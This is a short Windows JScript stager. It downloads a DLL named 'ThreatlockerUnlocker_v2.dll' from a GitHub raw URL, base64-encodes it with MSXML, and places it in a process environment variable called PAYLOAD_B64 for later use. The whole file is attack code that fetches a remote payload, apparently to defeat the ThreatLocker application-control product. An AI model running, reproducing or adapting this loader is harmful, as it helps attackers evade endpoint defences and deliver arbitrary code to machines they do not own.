var h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
h.Open("GET", "https://raw.githubusercontent.com/Lenard-Code/trash/main/ThreatlockerUnlocker_v2.dll", false);
h.Send();

var xml = new ActiveXObject("MSXML2.DOMDocument");
var node = xml.createElement("b64");
node.dataType = "bin.base64";
node.nodeTypedValue = h.ResponseBody;
var base64 = node.text.replace(/\s/g, '');

var shell = new ActiveXObject("WScript.Shell");
var env = shell.Environment("Process");
env("PAYLOAD_B64") = base64;
